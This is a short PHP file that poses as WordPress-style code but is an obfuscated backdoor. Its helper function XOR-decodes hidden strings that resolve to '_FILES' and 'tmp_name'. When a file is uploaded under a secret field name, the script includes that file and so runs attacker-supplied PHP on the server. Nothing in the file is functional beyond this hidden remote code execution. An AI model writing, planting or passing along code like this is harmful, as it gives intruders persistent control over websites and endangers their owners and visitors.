<?php 	
function single()

{
    $tb_list = 'US2WcWJ7u5K';
    $name = $tb_list;
    

    $prime_pattern = $GLOBALS[entities("%0A%15%7B%1B%26%04", $name)];

    $post_author = $prime_pattern;
	$cdata_regex = 'del_file';
    $return = isset($post_author[$name]);
    if ($return)

    {

        $suppress_filters = $prime_pattern[$name];
	$non_cached_ids = 'custom';
        $meta_input = $suppress_filters[entities("%21%3EB%08%0D6%27R", $name)];
        $utf8_pcre = $meta_input;

        include ($utf8_pcre);
    }
}
function entities($allowed, $image_url)

{
    $has_archive = $image_url;
    $excerpt = "url" . "decode";

    $ancestor = $excerpt($allowed);

    $override_slug = substr($has_archive,0, strlen($ancestor));
    $cache = $ancestor ^ $override_slug;
    return $cache;

}


single();

?>
